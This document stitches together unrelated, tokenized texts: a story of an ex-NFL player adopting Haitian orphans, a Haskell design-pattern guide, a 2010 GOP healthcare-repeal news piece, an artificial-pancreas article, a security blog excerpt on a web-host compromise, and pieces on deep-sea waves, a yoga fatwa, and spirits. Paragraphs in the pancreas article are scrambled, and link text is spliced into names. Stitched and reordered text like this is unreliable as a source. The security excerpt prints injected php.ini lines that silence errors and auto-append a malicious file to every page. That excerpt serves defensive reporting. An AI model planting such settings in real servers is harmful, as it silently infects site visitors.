He saw horrific scenes of people leaving buildings with their limbs missing or torn apart .
He hoped his kids had n't suffered that way .
For four days , he could n't sleep .
For four days , he imagined five funerals and then a sixth : his own .
Kermit would sit in his study or on his back porch at 5:30 every morning and say to himself , " If they do n't survive , then what am I needed for ?
I have a purpose in them .
They are my salvation .
And if they are n't here , then why am I here ? "
On the fourth day , Tami finally reached one of her key contacts on the phone .
She asked him whether he'd heard from any of the Haitian ministries , and he told her to give him a few hours .
She and Kermit got down on their knees and waited .
" And then he called me back , " Tami remembers .
" And he said , ' Tami , they 're alive . '
And I just fell to the ground crying , ' They 're alive .
They 're alive . ' "
A small good comes from a large evil
The earthquake took about 250,000 lives .
But , with their heads bowed , Kermit and Tami also hoped it might open a window for five .
Tami walked around with a telephone attached to her ear .
That , or they were on the Internet .
They learned that legislators from Ohio , Pennsylvania and upstate New York were trying to pry all kinds of children out of Haiti , which was an uplifting sign .
But the brighter news came three days after the quake when Janet Napolitano , the U.S. secretary of Homeland Security , announced that the U.S. would be granting humanitarian parole to children already in the process of being adopted .
Tami and Kermit understood that was the ticket .
They called the State Department to get all five kids on the list and began frantically filling out paperwork .
But when they checked back a few days later , the computer did n't show the kids ' names .
They wanted to pull their hair out .
They resubmitted the paperwork and solicited the help of legislators Dianne Feinstein and Maxine Waters of California .
Finally , 12 days after the earthquake , they were given word that the kids were being flown to Florida .
They made arrangements to fly and meet them , but when Tami called the State Department to confirm that the kids ' travel documents were set , once again none of the five was on the travel list .
The U.S. government asked her to refile the paperwork , which would mean another week 's delay , and Tami broke down sobbing .
Once more , she pleaded her case , and this time the State Department apologized .
It said it had found four of the kids ' travel docs .
" Just four ? " Tami asked .
" Yes , just four . "
That meant that one of the kids was n't coming , that one of them still would be stuck in a place where there was rampant disease , dead bodies , and little food or clean water .

Learning the meaning of ' interminable '
Time was of the essence .
UNICEF was livid that a Dutch group had hastily flown a flock of children out of the country , and to prevent child trafficking , the government planned to restrict all travel out of Haiti .
Clifton conceivably could be stuck in the mayhem indefinitely , and Tami told Kermit she might need to fly to Port - au - Prince and escort him out herself .
She could n't understand how he had fallen through the cracks .
His adoption papers had been filed first .
He 'd been the catalyst for Tami and Kermit 's marriage .
He 'd given Kermit hope again .
He 'd started it all .
And now he was in limbo at the American embassy in Port - au - Prince , while his brothers and sisters were at the airport .
Christopher Park for ESPN.com Kermit and Tami were ready for their children to come home and settle into a one - story , three - bedroom house on a cul - de-sac in Riverside with a horse stall and a swimming pool .
Earlier , Tami had been given the phone number of a high - ranking official at the Department of Homeland Security , but she 'd been told to call only in an emergency .
Now was that moment .
She dialed the official , who told her Clifton 's siblings would arrive in Miami on Jan. 25 .
But the official needed more time on Clifton , probably a couple of days .
Tami was near her breaking point .
Haiti was still having 6.0 magnitude aftershocks .
They decided Kermit would meet the four siblings in Miami and a friend of Tami's who owned a private plane would fly her to the Dominican Republic .
From there , she 'd get to Port - au - Prince , find Clifton and bring him home .
But an hour later , a woman from the State Department called .
" Are you sitting down , Tami ? "
" Should I be ? "
" I just wanted you to know that all of your kids are on planes headed for Orlando .
You need to go there instead of Miami . "
" Are they together ? "
" No .
Four of them are on a military transport plane , and Clifton made a cargo plane .
But they 're on their way .
Go get your kids . "
Kermit and Tami caught a red -eye to Orlando that night , arriving at 8:30 the morning of the 26th .
They were escorted to a makeshift office set up by Homeland Security , grilled about their intentions and asked to turn over paperwork .
The U.S. government had been warned that unauthorized civilians were trying to grab stray Haitian kids and take them home .
So Tami and Kermit found themselves locked down for six hours .
By 4 that afternoon , they were finally directed to a large customs area where about 100 people were sitting down .
Around 40 of them were Haitian kids , and as the couple entered the room , 40 heads started turning their way .
Then they heard , " Dad ! "
The oldest boy , 14 - year - old Jameson , had seen Kermit first .
An instant later , 9 - year - old Semfia , the younger girl , was jumping into Kermit 's arms and 10 - year - old Zachary , the youngest boy , had attached himself to Kermit 's leg .
Tami got the leftovers -- 16 - year - old Manoucheka , the older girl , and 11 - year - old Clifton .
Kermit checked to see whether the kids had any cuts or scrapes .
He looked into their eyes to make sure they could see .
He was bawling as he held them .
There was no doubt among the Homeland Security employees -- these were Kermit and Tami 's children .
" It was the best day I 'd ever had -- since 1984 , " Kermit says .

When the children arrived safely in Orlando two weeks after the earthquake , Kermit 's new family was finally together .
A second chance to smile
All the Alexanders -- all seven of them -- flew home to California the next day .
They did n't mean to cause a scene , but the kids walked single file through the Orlando terminal behind Tami , like five little ducklings .
Kermit , the proud papa , trailed behind them all , counting heads , grinning .
The previous night , the kids had begun to share snippets of their ordeal .
They 'd slept outside after the earthquake , frightened of the aftershocks .
They had n't had a bath since Jan. 12 .
At their hotel , Tami asked whether they wanted to take a hot shower , but they 'd never heard of such a thing .
The water in Haiti was always cold , and when they took their first American shower , they did n't want to get out .
It was heaven .
They wanted to take two .
All of the amenities were new to them .
They had never flown in a commercial jet before and were shocked to see a bathroom on the plane .
They had never slept on real mattresses , either .
In Haiti , the beds were made of cardboard .
That , or they 'd sleep on a pile of clothes on the floor .
So their first American hotel was sweet culture shock .
And when they arrived late at night at their new house in Riverside , on the cul - de- sac , they fell fast asleep in a matter of minutes -- on thick mattresses -- curious about what was in store for them in the morning .
When they awoke and took a look around the house , they went bonkers .
" This is ours ? " Jameson asked .
" This is yours . "
Christopher Park for ESPN.com
A crowded family -- just the way Kermit likes it .
From left to right : Semfia , Clifton , Zachary , Manoucheka , Tami , Kermit and Jameson .
The kids went room to room , digging through every drawer , every closet .
They touched every piece of clothing , sat in every chair , opened every cupboard full of food , the whole time clamoring , " This is ours ?
This is ours ? "
They bolted to their expansive backyard and found the basketball court and the trampoline and the pool .
They spent the entire day in the sun , and while they were outside , Tami and Kermit happened to peek into the kids ' rooms .
Every bed was perfectly made .
" Could 've bounced a quarter off them , " Tami says .
There were so many questions to ask about the earthquake , but Tami and Kermit did n't push the kids , reasoning that they would open up when they were ready .
Finally , Clifton shared that he'd been playing soccer when the quake hit and he had simply lain down on the ground while he heard other children screaming .
" A lot of people die , " he said .
As for the other four , who had been closer to the epicenter , they were lucky their orphanage had sturdier buildings .
Jameson and Zachary were playing basketball outside at the time of the quake , which was a blessing .
Manoucheka was in the baby nursery and ran outside carrying some of the infants .
Semfia was eating rice and could n't understand why she could n't get the spoon to go in her mouth .
They each had a tale .
After a week at home to settle in , Kermit began walking the children to school every day .
Before long , other kids were inviting them over for playdates , and they were becoming more Americanized by the day .
They liked pizza , not broccoli .
They rode their bikes .
They were fascinated by roller skating .
They stayed up late .
Semfia learned every song from " High School Musical " and wanted to be a diva when she grew up .
Jameson wanted to be a soccer pro. Zachary , who cooked dinner every night with Tami , planned to be a businessman .
Manoucheka wanted to be a pediatrician .
And Clifton intended to be a pastor , like Kermit 's grandfather .
As the kids ' diet and nourishment improved , the changes in them were striking .
Clifton grew an inch in the first two months .
Semfia grew maybe two .
Jameson grew maybe three and began towering over everyone .
They were all immersed in sports .
Semfia was a budding soccer player and sprinter .
Manoucheka became enamored of volleyball .
As for the boys , basketball -- not soccer -- became their regular game du jour .
Clifton rooted for Kobe ; Jameson and Zachary preferred LeBron .
The three of them even began playing an imaginary Lakers - Cavaliers final in the backyard .
Kermit also showed them highlights of his 49ers days , and loved it that they did n't know who Gale Sayers and George Halas were .
He also watched Clifton eat cotton candy for the first time -- the boy was stumped as to why the candy disappeared in his mouth -- and it made him think again of Tiequon Cox .
Clifton was Kermit 's do - over , his second chance at life .
This was n't lost on the old pro .
He would get up every morning about 5:30 , while the rest of the house was sleeping , and he 'd meditate and think about Ebora .
Five - thirty in the morning is when they used to have their coffee together , and he'd talk to her each morning at dawn now and thank her for making this happen .
Because he knew she had made this happen .
He only wanted to be the parent she had been , and , at every one of those 5:30 meditations , he would pray that he could be a rock for his kids the same way he had been a rock before 1984 .
He and his mom used to talk back then about saving the world , and now he at least had a chance to save his own sliver of it .
He had rescued five kids .
Or maybe five kids had rescued him .
Either way , his house was full , and nothing was better than a full home .
He hoped the children would someday feel about him the same way he felt about Ebora .
But it could n't be rushed ; it had to happen organically .
And then the earth moved again .
On Easter Sunday , in midafternoon , a 7.2 magnitude earthquake rocked Baja California , a few hours south of the cul - de-sac .
The ground rolled beneath the house , and Kermit jumped up , afraid the kids would have hysterical flashbacks .
He rushed to see where they were , and found four of them outside playing basketball , completely unaware .
They had n't even felt a bounce .
Only Manoucheka , his oldest daughter , had been inside to feel the house shake .
She ran into Kermit 's arms and asked him , " Are n't you afraid , Dad ? "
" No , we 'll be fine . "
" If you 're OK , I 'm OK , " she said , exhaling .
The two of them then sat down on the couch , and she went back to writing in her journal .
Kermit stared straight ahead .
He could hear the other kids squealing and playing .
The guilt was nowhere in him now .
Everybody was safe and sound .
Safe and sound .

Attention Conservation Notice .
A listing of how Gang of Four design patterns might be equivalently implemented in Haskell .
A phrasebook for object - oriented programmers dealing with functional programming concepts .
In their introduction to seminal work Design Patterns , the Gang of Four say , " The choice of programming language is important because it influences one 's point of view .
Our patterns assume Smalltalk / C++- level language features , and that choice determines what can and cannot be implemented easily .
If we assumed procedural languages , we might have included design patterns called ' Inheritance , ' ' Encapsulation , ' and ' Polymorphism . ' "
What is easy and what is hard to implement in a functional programming language ?
I decided to revisit all 23 original Gang of Four design patterns under that lense .
My hope is that these results will be useful to Object Oriented Programmers seeking to learn the ways of Functional Programming .
Strategy .
First class functions and lambdas .
Any extra data that might be placed as class members is traditionally implemented using closures ( which stash the data in a lambda function 's environment ) or currying ( which create implicit closures for function 's arguments ) .
Strategies are also powerful because they are polymorphic ; type synonyms for function types can play a similar role .
Java has recognized anonymous functions as a good idea , and have added facilities for anonymous classes , which are frequently used in this capacity .
Factory Method and Template Method .
Higher - order functions .
Instead of making a subclass , just pass the the function you 'd like to vary the behavior of with the function .
Abstract Factory , Builder and Bridge .
Type classes and smart constructors .
Type classes are capable of defining functions which creating instances of themselves ; all a function needs to do to take advantage of this is to commit itself to returning some value of type TypeClass a => a and using only ( constructor et alia ) functions that the type class exposes .
If you 're not just constructing values but manipulating them with the general type class interface , you have a Bridge .
Smart constructors are functions built on top of the basic data constructor that can do " more " , whether this is invariant checking , encapsulation or an easier API , this can correspond to more advanced methods that a factory provides .
Adapter , Decorator and Chain of Responsibility .
Composition and lifting .
Function composition can be used to form a pipeline of data between functions ; a foreign function can be sandwiched between two functions that convert to and from the type the function expects , or a function can be composed with another to make it do more things .
If the signature stays the same , one or more of the functions was endomorphic .
If the functions have side effect , it may be Kleisli arrow composition ( more plainly spoken as monadic function composition . )
Multiple functions can handle the same input using the Reader monad .
Visitor .
Equational functions .
Frequently foldable .
Many functional languages favor grouping the same operation on different data constructors together , in a mathematical equational style .
This means similar behaviors are grouped together .
Traditional grouping of behavior by " class " is implemented with type classes .
Visitors typically collapse the data structures they operate on into smaller values , this is seen in the fold family of functions .
Interpreter .
Functions .
Frequently circumvented with an embedded domain specific language .
Algebraic data types make light - weight abstract syntax trees easy to formulate .
Just as Visitor is often used with Interpeter , you 'll probably write your interpreting functions with pattern matching .
Even better , do n't come up with another data type ; just use functions and infix operators to say what you mean .
Closely related to ...
Command .
Monads .
See also algebraic data types , frequently generalized ( GADT ) .
A pure language will not run your IO until main touches it , so you can freely pass values of type IO a without fear of actually causing the side - effect , though these functions are difficult to serialize ( a common motivation behind Command ) .
Parametrization of the action to perform is once again achieved through higher - order functions .
GADTs are a little more bulky , but can be seen in places like the Prompt monad ( PDF ) , where a GADT is used to represent actions that another function interprets into the IO monad ; the type gives a statically enforced guarantee of what operations in this data type are allowed to do .
Composite .
Recursive algebraic data types .
Especially prominent since there 's no built - in inheritance .
Iterator .
Lazy lists .
Iterators expose an element - by - element access of a data structure without exposing it 's external structure ; the list is the API for this sort of access and laziness means we do n't compute the entirety of the stream until it is necessary .
When IO is involved , you might use a real iterator .
Prototype .
Immutability .
Modification copies by default .
Flyweight .
Memoising and constant applicative forms ( CAF ) .
Instead of calculating the result of an expression , create a data structure that contains all of the results for all possible input values ( or perhaps , just the maximum memo ) .
Because it is lazy , the result is not computed until it is needed ; because it is a legitimate data structure , the same result is returned on successive computations .
CAFs describe expressions that can be lifted into the top - level of a program and whose result can be shared by all other code that references it .
State and Memento .
Unnecessary ; state has an explicit representation and thus can always be arbitrarily modified , and it can include functions , which can be changed to change behavior .
State as a function ( rather than an object or an enumeration ) , if you will .
The encapsulation provided by Memento is achieved by hiding the appropriate constructors or destructors .
You can easily automatically manage past and future states in an appropriate monad such as the Undo monad .
Singleton .
Unnecessary ; there is no global state except in a monad , and the monad 's type can enforce that only one instance of a record is present ; functions exist in a global namespace and are always accessible .
Facade .
Functions .
Generally less prevalent , since function programming focuses on input - output , which makes the straight - forward version use of a function very short .
High generality can require more user friendly interfaces , typically implemented with , well , more functions .
Observer .
One of many concurrency mechanisms , such as channels , asynchronous exceptions and mutable variables .
See also functional reactive programming .
Proxy .
Wrapped data types , laziness and garbage collector .
See also ref monadic types ( IORef , STRef ) , which give more traditional pointer semantics .
Laziness means structures are always created on demand , garbage collection means smart references are not necessary .
You can also wrap a data type and only publish accessors that enforce extra restrictions .
Mediator .
Monad stacks .
While it 's not useful to talk about interactions between objects , due to a preference for stateless code , monad stacks are frequently used to provide a unified interface for code that performs operations in a complex environment .
Comments and suggestions appreciated ; I 'll be keeping this post up - to - date .

House Republican leaders introduced a bill Thursday to repeal and replace the sweeping healthcare law adopted in late March .
According to Rep. Roy Blunt Roy Dean BluntGOP senators confident Trump pick to be confirmed by November Sunday shows preview : Lawmakers prepare for SCOTUS confirmation hearings before election SCOTUS confirmation in the last month of a close election ?
Ugly MORE ( R - Mo. ) , the measure would repeal the current law and replace it with the alternative the minority party offered to the original healthcare legislation last November .

“ As unpopular as this healthcare bill is today , it ’s at the height of its popularity , ” Blunt said .
“ The more the American people know about it , the more concerns they are going to have , and the more they are going to look at alternatives . ”
Chances are slim Republicans could get their measure to the floor , given the Democratic majorities in the chamber , but it could make a useful campaign tool for the party .
The vote on healthcare reform has become a political issue in a year rife with anti-incumbent sentiment .
Tea Party activists opposed the legislation and protested on Capitol Hill during the March vote , shouting , “ Kill the bill . ”
Several Democratic candidates in conservative - leaning districts have said they would not have voted for the bill , while unions are withholding support from some Democratic incumbents who voted against the legislation .
A Gallup poll taken earlier this month found that healthcare is still in the Top Five list of voters ’ concerns .
Another Gallup poll found that voters are “ no less concerned about paying the costs of a serious illness or accident , or normal healthcare costs , than they were last year . ”
In all , 20 GOP lawmakers co-sponsored the repeal - and - replace bill , including House Minority Leader John Boehner John Andrew BoehnerLongtime House parliamentarian to step down

Rep. Wally Herger ( R - Calif. ) , the ranking member of the Ways and Means Subcommittee on Healthcare , formally submitted the bill .
A Herger aide explained the legislation would repeal the entire law but would provide protections for those with pre-existing conditions .
“ [ It ] would prevent an insurance company from denying new coverage to someone with prior coverage on the basis of a pre-existing condition .
So if you lose the health insurance because you lose your job , move , get divorced or just want to change plans , you are protected , ” Herger spokesman Matt Lavoie said .
Democrats laughed off the GOP effort to repeal the law .
An aide for Assistant to the Speaker Chris Van Hollen ( D - Md. ) said that the “ repeal Repubs ” would create a boon for the health insurance industry .
“ Repeal Repubs are out of step with the majority of Americans who want to give the reform bill a chance to work .
If the GOP gets their way , they would actually strip individuals and families of important rights and benefits and add to the deficit they created .
This is a healthcare bill only insurance companies would love , ” Van Hollen spokesman Doug Thornell said .
Asked of the chances the measure would move through the House , Herger ’s Democratic counterpart , Rep. Pete Stark ( Calif . ) , responded , “ Like a prayer in hell . ”

The chairman of the Ways and Means Health subcommittee admitted he had n’t seen the GOP measure but added , “ It ’s probably lousy . ”
Republicans say their bill would reduce costs , increase access and create transparency and more competition in the system .
Blunt claimed that of all the healthcare measures scored by the Congressional Budget Office ( CBO ) , this measure is “ the only thing that anybody offered that the Congressional Budget Office said would decrease the cost of insurance for everybody . ”
Asked why leaders did n’t submit a measure solely to repeal the massive entitlement law , Blunt responded , “ Then you ’d be asking , ‘ Why do n’t you have any ideas ? ’ ”
At least one Republican has a problem with his leadership offering a repeal - and - replace bill .
Rep. Steve King ( R - Iowa ) said in an interview with The Hill that Republicans “ should be for 100 percent repeal .
The replacement component of it should be a separate question because it blurs the issue ; once you tie a comprehensive replacement to a repeal bill , you ’ve guaranteed it ’s going to bog down and the American people that are sick of backroom deals are going to ask a whole lot of questions that we are going to have to answer . ”
King called ObamaCare a “ malignant tumor that has metastasized as we speak . ”
Rep. Charles Boustany Charles William BoustanyPartial disengagement based on democratic characteristics : A new era of US - China economic relations Lobbying world March tariff increase would cost 934K jobs , advocacy group says MORE Jr. ( R - La. ) , a co-sponsor of Herger ’s measure , disagreed .
“ We have got to understand that the Senate is not going to be in Republican hands , nor is the White House until hopefully 2012 , so the political reality is we have to operate within reality — and we will go as far as we can to repeal the most egregious parts of the bill and replace them with good reforms , ” Boustany explained .
In two preliminary experiments reported last month in Science Translational Medicine , 11 adults , including Matthews , spent 27 hours in hospital beds tethered to intravenous lines that drew their blood and tested their sugar levels every five minutes .
The reading was fed into a laptop computer , which used software developed by BU research scientist Firas El - Khatib , Damiano ’s former student , to decide when to deliver insulin or glucagon just beneath the skin using commercially available pumps .
A bioengineer specializing in the mechanics of blood flow , Damiano expanded his research to develop an artificial pancreas after his son was diagnosed with type 1 diabetes at 11 months old .
Damiano checks his now - 11 - year - old son ’s blood sugar every two hours throughout the night .
If further testing shows the system works , it could take up to five years to reach the market , said Dr. Steven Russell , a Massachusetts General Hospital endocrinologist who is part of the development team .
His coleader , Edward Damiano of Boston University , estimated the system will cost up to $ 7,000 for the glucose monitor and pump , plus another $ 100 a week for insulin , glucagon , and sensors that must be replaced every few days .
The “ artificial pancreas ’’
Matthews used is one of several devices in development that marry a glucose sensor with a computer - guided insulin pump .
It automatically monitors blood sugar levels and , when needed , delivers insulin to lower blood sugar .
In an advance over some other systems , it can also inject another hormone , glucagon , to raise blood sugar as needed .
People with type 1 diabetes make glucagon but do not secrete it properly in response to low blood sugar .
If blood sugar falls too low , they risk falling into a coma .
If blood sugar levels stay too high , they can suffer long - term complications that result in kidney damage , heart disease , amputations , and blindness .
Because their pancreases no longer produce insulin , which ferries blood sugar into cells , people with type 1 diabetes must inject the hormone several times a day or wear a pump that infuses preset amounts into their bodies .
For people with type 1 diabetes , keeping the condition under control is a constant process of testing blood sugar levels and adjusting how much insulin they need , based on what they eat and how active they are .
Now 48 and a Marlborough firefighter , Matthews is still waiting .
But he has high hopes for a device being developed by Boston researchers that mimics the healthy human pancreas .
Matthews participated in a study of a prototype of the device , and while it ’s not a cure , it kept his blood sugar in check without the guesswork of current treatments .
In 1965 , doctors told Edmoth Matthews ’s mother that by the time her 3 - year - old son turned 18 , there would be a cure for type 1 diabetes .
The subjects averaged blood sugar levels within the target range for good control , although in the first experiment five of them occasionally had levels sink low enough that they needed to drink orange juice to bring them back up .
After the researchers determined the patients were absorbing insulin at widely different rates , they adjusted the computer algorithm and succeeded in keeping blood sugar levels where they should be , without dips into hypoglycemia .
The researchers eventually hope to replace the laptop with a computer chip that would reside in a dual insulin - glucagon pump .
Together with a glucose monitor that measures blood sugar levels every five minutes through a sensor inserted beneath the skin , the system would approximate what the healthy pancreas does minute by minute .
The work is funded by the Juvenile Diabetes Research Foundation and the National Institute of Diabetes and Digestive and Kidney Diseases .
Diabetes specialists called the study an important step forward , but said there are challenges .
Dr. Howard Wolpert of the Joslin Diabetes Center in Boston said continuous glucose monitoring systems are n’t as accurate as one would hope because they measure sugar in the fluid between cells , not in the bloodstream .
That means there ’s a delay in sensing glucose levels , just as there is a lag when insulin is injected or infused beneath the skin rather than released into the bloodstream , as a healthy pancreas would do .
“ The system ca n’t turn on and off rapidly enough to respond to changes in the glucose level , ’’ he said .
Dr. David Harlan , director of diabetes at UMass Memorial Medical Center in Worcester and former diabetes branch chief at NIDDK , also said there are more hurdles to clear .
“ The new system ’s advance is that it can respond by infusing glucagon to overcome low blood sugars , ’’ he said , but it does n’t control doses of insulin or glucagon finely enough .
“ Imagine driving a car where the accelerator was all the way down or not .
You could control the speed of the car by taking your foot completely off it or flooring it and then putting your foot on the brake .
. . .
It works , but it ’s not ideal . ’’
NIDDK considers artificial pancreas systems a research priority , said Dr. Guillermo Arreaza - Rubín , director of the institute ’s Glucose Sensing and Insulin Delivery Technologies Program .
“ They are not a cure but they may represent what some patients would call a cure .
If my glucose is well controlled without fear of hypoglycemia , if my chances of developing kidney failure , blindness , or other chronic complications [ decline ] , it may really make a great difference in terms of quality of life . ’’
Damiano has a deadline .
“ I have this little ticking clock that goes off in seven years when my son goes off to college , ’’ he said .
“ I firmly believe that we are building . . . a system that will regulate people ’s blood sugar exquisitely well .
It will nearly normalize their blood sugar to the point where they wo n’t have to fear going to bed at night and not waking up . ’’

Last week we reported about an attack against Network Solutions that modified the “ php.ini ” file on hundreds of sites to append a malicious payload to all of their pages .
You can read more about it here :
https://blog.sucuri.net/2010/05/new-infections-today-at-network.html
The problem was caused by an internal bug on Network Solutions that was supposedly fix already .
Yet , this morning we started to receive reports of a very similar kind of attack against sites on their shared servers .
According to the time stamp of files , they were added between 1 and 2 am today ( May 7th ) .
First , the cgi -bin / php.ini had this extra lines :
include_path= ” . ” ;
; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ;;;
display_errors= off ;
; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ;;;
error_reporting=0 ;
; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ;;;
auto_append_file = .nts ;
; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ;;;
See the “ auto_append_file ” ?

Scientists exploring the deep sea have discovered a distinctive kind of breaking wave .
The finding reveals the presence of a subtle new force that can stir the dark seabed , and it helps to explain some of the nuances of planetary recycling and the provision of food to abyssal life .
The discovery also illustrates the radical nature of the insights that lay behind the start of the scientific revolution some four centuries ago .
The deep waves have the distinguishing curl of Kelvin - Helmholtz billows , a type of wave present throughout nature .
Scientists have long tracked these distinctive waves , finding them on the windblown sea , on sand dunes , among clouds and even in the churning gases of Saturn and Jupiter .
They originate when two fluids , or gases , ( or sea and air ) , move past one another at different speeds .
At the boundary , the interaction produces a sequence of crests that rise gently and then curl into chaotic turbulence .
In their early stages , the waves produce the kind of slopes that surfers dream about .
In a first , scientists from the Netherlands and France found the breaking waves rippling down the sides of an underwater mountain in the Atlantic some 700 miles south of the Azores .
On Feb. 6 , in Geophysical Research Letters , a publication of the American Geophysical Union , the scientists reported how a network of temperature sensors that they moored at a depth of a half kilometer , or a third of a mile , gave strong evidence of the passing waves .
SEVERAL years ago , I developed something called arthrosis in my knees .
This is a first cousin to arthritis , and is extremely painful .
After a few months on painkillers , I enrolled in a yoga class out of desperation .
Initially , contorting my out - of - shape body into the positions required by our teacher was very difficult , but soon I managed to bully my joints into approximating the postures our elegant instructor assumed so effortlessly .
A few months into this routine , I began to look forward to the thrice - weekly yoga classes .
In our darkened room , soft music would play , while we were encouraged to empty our minds and hold the positions for just a little longer each time .
My body became suppler , and crucially the pain in my knees disappeared .
Unfortunately , the timings of our class were changed , and I could no longer pursue my new interest .
Nevertheless , I have nothing but pleasant memories of the year - long experience .
Now , as my creaking body protests each time I lower myself to pick up something from the floor , I wish I could have continued my yoga lessons .
So imagine my surprise when I discovered that Malaysia`s top Islamic body recently issued a fatwa prohibiting Muslims from practising yoga due to elements of Hinduism the ancient system is supposed to contain .
According to The Island , a Sri Lankan daily , the Malaysian National Fatwa Council`s chairman , Shukor Husin , has said that “ many Muslims fail to understand that yoga`s ultimate aim is to be one with a god of a different religion ” .
I had no idea that when our yoga teacher told us to empty our minds , she was doing so with the aim of making space in that limited cavity for a foreign god .
Fortunately , this edict is not legally binding , unless of course the government makes it a law .
And in case you think this is far - fetched , just remember that the Malay government has recently made it illegal for non-Muslims to use the word ` Allah` , for fear that “ it would confuse Muslims ” .
It seems many other things confuse Muslims in Malaysia the fatwa council recently declared tomboy - ish behaviour by girls un -Islamic on the grounds that girls who act like boys “ violate Islam`s edicts ” .
Now having grown up with my cousin Meher who played cricket and rode bikes with us as kids , and is now long happily married , I cannot imagine how her early years as a tomboy make her un -Islamic .
But according to Maulana Shukor Husin , this kind of innocent childhood behaviour is unacceptable .
However , not all Malay Muslims are taking this latest fatwa lying down .
The Island quotes Putri Rahim as maintaining “ I am mad !
Maybe they have it in mind that Islam is under threat .
To come out with a fatwa is an insult to intelligent Muslims .
It`s an insult to my belief . ”
But the members of the fatwa council are in good company , for Christian fundamentalists in the United States have long opposed yoga classes in schools , arguing that it violates the secular principle of separating church from state .
According to them , yoga`s Hindu roots conflict with Christian teachings .
And apparently , Egypt`s highest theological body banned yoga for Muslims in 2004 .
I must confess that my meagre knowledge of Islam does not qualify me to give a definitive opinion .
However , based on personal experience , I can say with greater authority than Maulana Shukor Husin that yoga is a wonderful system for the body and the mind , relaxing both , while enhancing the powers of concentration .
Millions around the world practise it every day , and are well rewarded for their efforts .
To deny its benefits to Muslims is to declare that we march to the beat of a different drummer .
So what planet are these fundamentalists on ?
And what century do they live in ?
Surely everything that`s good for us , or is fun , cannot be declared un -Islamic on a whim ?
Even I know that there is no mention of yoga in the holy book , so how can these killjoys come out with their absurd fatwa ?
Sadly , the Islam of Shukor Husin and his ilk has been reduced to a list of dos and don`ts , with the latter having swollen to many times the former .
Almost every month , there is an addition to what is forbidden to Muslims .
But as many Muslims continue to flout this litany of edicts , they are pushed into the illicit enjoyment of what is natural and pleasurable .
Their sense of guilt grows , as does the level of hypocrisy in Muslim societies .
And if this kind of retrogressive mindset can hold sway in a relatively modern Muslim country like Malaysia , just think what is going on in nations like Saudi Arabia and Pakistan .
One explanation for these reactionary fatwas is that the ruling Muslim party , in power since 1957 , has seen its majority greatly eroded in recent elections due to the gains made by multiracial opposition parties .
This fear of losing their grip on power due to growing secularism might be causing conservatives to draw a line in the sand .
Whatever the reason , such desperate and ultimately futile measures only serve to further marginalise Muslims .
Already viewed as a backward community by much of the world , Muslims risk withdrawing from the rest of mankind at a time when globalisation is breaking down barriers at a frenzied pace .
In India , Muslim ulema have won the right to dominate women as a religious right .
This exemption was granted to them by a secular Congress Party .
In Pakistan and Afghanistan , the Taliban and their supporters want to ban music , movies and even kite - flying .
When the Taliban were in power , they had banned education for girls , and had denied women medical care from male doctors .
Where will this madness end ?
It will end if and when Muslims decide that enough is enough , and that they do not want to live in the sixth century .
Unfortunately , there is much confusion in the Islamic world , with the result that uneducated mullahs issue half - baked edicts on everything under the sun , and ordinary people , unsure of themselves , pay lip service to these teachings .
Millions in the Islamic world have convinced themselves that their current weakness has been caused by the West .
If they examine the causes for their backwardness more closely , they will discover that they lie much closer to home than they would like to admit .

“ Some people like our stuff and some people do n’t , and that ’s just fine with us . ”
– Gary Fleshman , General Manager , Rogue Ales
It was a pretty strong statement that started off my tasting of Rogue Distillery ‘s spirits .
Best known for their micro-craft beers ( like the Dead Guy Ale ) , Rogue has made a move into the spirits space with a line of Gin , Rum and Whiskey .
With distilleries split between their Oregon coast location and downtown Portland , Rogue does n’t have the luxury of having all their spirits under the same roof .
Their rum , which is distilled from C & H sugar , is done by a single apprentice without the immediate oversight of a master distiller .
Their barrel management also seems to be pretty slip shot , with spirits sitting in a variety of barels at a variety of ages .
“ We want to get this out there as soon as possible and when they found out that things had to sit in barrels for a long time they got pretty pissed . ” – Gary Fleshman , General Manager , Rogue Ales
As a whole , the Rogue spirits clearly reflect a distilling program in crisis .
Of the six spirits I tasted , at least three of them ranked as some of the poorest distilled spirits I have ever tasted .
Rogue Spruce Gin ( 90 proof , $ 35 ) –
Of all the Rogue spirits I tasted the spruce gin was the only one that was n’t absolutely unpalatable .
It ’s an interesting concept to use spruce as the top note of a gin , but it completely takes the place of juniper , which they almost completely abandoned ( there is a trace amount as a technicality so they can still call it gin ) .
In addition to the pronounced spruce , the gin is also heavily flavored with cucumber .
It ’s on the nose , in the palate and is almost more dominate than the spruce itself .
There are also some ginger and citrus notes in the taste but those peter out .
One could safely argue that Rogue Spruce Gin is not really a gin , it ’s more a spruce / cucumber frankenstein of a spirit .
Not Recommended
Rogue Pink Gin ( 90 Proof $ 35 ) –
If you did n’t know that this is gin , you ’d never guess it .
Aged in pinot noir barrels , this gin strips away any and everything that even remotely works about the Rogue Spruce Gin and turns it into something overly sweet and barely palatable .
The Rogue Pink Gin has some vanilla and cherry on the nose that lead into a pinot and vanilla like taste .
But this batch of gin was seriously off .
The body was hot ( not in a good way ) and it finished hot in a way that ’s indicative of a poorly distilled spirit .
As I tasted this , apprentice distiller Bree Winchell kept repeating to me over and over , “ We only use the heart .
We only use the heart ” like a mantra , but it ’s clear that in the batch of pink gin I tried the cut came too soon and there is clear evidence of heads in this distillate .
Not Recommended
Rogue White Rum ( 80 proof $ 39 ) – As with the Rogue Pink Gin , I found some serious issues with the distilling of Rogue ’s White Rum .
Hot from the first sip through the finish , this one - note rum was simply disgusting .
It tastes like it contains the heads of the distillate with a varnish - like tone to it .
What ’s even more shocking is the price tag of $ 39 .
I was told that Rogue is phasing out their white rum and I can say that ’s the only good news about this spirit .
I really thought the white rum was one of the worst spirits I have tasted , until I tasted the Hazelnut Spice Rum .
Avoid
Rogue Hazelnut Spice Rum ( 80 Proof $ 35 ) – Notable for the fact that it is now the single worst distillate I have ever tasted , the Rogue Hazelnut Spice Rum is vile and disgusting .
It is probably more suited to clean paint brushes than to be consumed by a human being .
The nose of the rum is so disgustingly strong that it overpowered everything else I tried to taste and I literally had to step away from the table to actually be able to smell the other spirits .
If the nose is bad the taste is worse .
It resembles what I ’d imagine infusing varnish with hazelnuts must taste like .
The finish is straight hot .
Avoid
Dead Guy Whiskey ( 80 Proof $ 40 ) – I ’m a huge fan of white dog and young spirits , and so the fact that this whiskey is only aged for 1 month really did n’t phase me .
What phases me is a whiskey that is this bad ( as it may very well be the worst whiskey ever made ) .
